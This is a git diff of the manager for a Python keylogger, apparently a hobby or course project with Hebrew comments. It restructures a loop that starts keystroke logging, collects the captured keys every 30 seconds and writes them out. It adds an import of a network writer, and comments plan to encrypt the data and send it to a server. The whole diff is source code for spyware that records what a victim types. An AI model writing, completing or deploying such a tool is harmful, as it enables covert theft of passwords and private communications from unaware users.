@@ -1,5 +1,6 @@
 from the_keylogger import Ikeylogger
 from The_filewriter import IWriter
+from network_writer import NetworkWriter
 from typing import  Optional
 
 import time
@@ -10,28 +11,38 @@ class KeyLoggerManager():
     def __init__(self):
         # create listener
         self.keylog=Ikeylogger()
-        self.file=IWriter()
-        
+        self.file_writer=IWriter()
+        self.PERIOD=float(30)
+        self.to_stop=False
+        self.networks=NetworkWriter
 
         # create filewriter
         # create encryptor
-        PERIOD = 30.0  # שניות
+          # שניות
 
     def do_work(self):
 
         # call listener start
-        self.keylog.start_logging()
+
         data_received = self.keylog.get_logged_keys()
-        self.file.send_data(str(data_received))
+        self.file_writer.send_data(str(data_received))
+
 
     def run(self):
-        next_t = time.monotonic()
+     #   next_t = time.monotonic()
+        self.keylog.start_logging()
         while True:
-            start = time.monotonic()
+         #   start = time.monotonic()
+            time.sleep(self.PERIOD)
+            if self.to_stop:
+                self.keylog.stop_logging()
+                break
             self.do_work()
-            next_t += self.PERIOD
-            sleep_for = max(0.0, next_t - time.monotonic())
-            time.sleep(sleep_for)
+
+          #  next_t += self.PERIOD
+           # sleep_for = max(0.0, next_t - time.monotonic())
+
+
 
 
 
@@ -43,13 +54,10 @@ class KeyLoggerManager():
         # call encryptor function to encrypt the file
         # send to server
 
-                # ... הפעולה המחזורית ...
 
-    #def run(self):
-     #   next_t = time.monotonic()
-      #  while True:
-       #     start = time.monotonic()
-        #    self.do_work()
-         #   next_t += self.PERIOD
-          #  sleep_for = max(0.0, next_t - time.monotonic())
-           # time.sleep(sleep_for)
+
+if __name__=="__main__":
+    manager=KeyLoggerManager()
+    manager.run()
+
+    input()
